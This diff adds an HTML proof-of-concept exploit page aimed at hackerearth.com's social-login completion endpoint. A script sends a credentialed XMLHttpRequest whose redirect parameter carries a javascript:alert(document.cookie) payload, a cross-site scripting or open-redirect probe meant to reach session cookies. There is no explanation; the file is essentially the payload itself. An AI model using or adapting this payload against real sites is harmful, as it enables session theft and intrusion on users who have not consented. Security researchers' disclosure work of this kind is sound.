@@ -1,0 +1,26 @@
+<html>
+<body>
+<script>history.pushState('', '', '/')</script>
+<script>
+  function submitRequest()
+  {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://www.hackerearth.com/social-login-complete-page/?redirect=javascript:alert(document.cookie)", true);
+    xhr.withCredentials = true;
+    var body = "";
+    var aBody = new Uint8Array(body.length);
+    for (var i = 0; i < aBody.length; i++)
+      aBody[i] = body.charCodeAt(i);
+xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+        alert(xhr.response);
+        }
+} 
+    xhr.send(new Blob([aBody]));
+  }
+</script>
+<form action="#">
+  <input type="button" value="Submit request" onclick="submitRequest();" />
+</form>
+</body>
+</html>
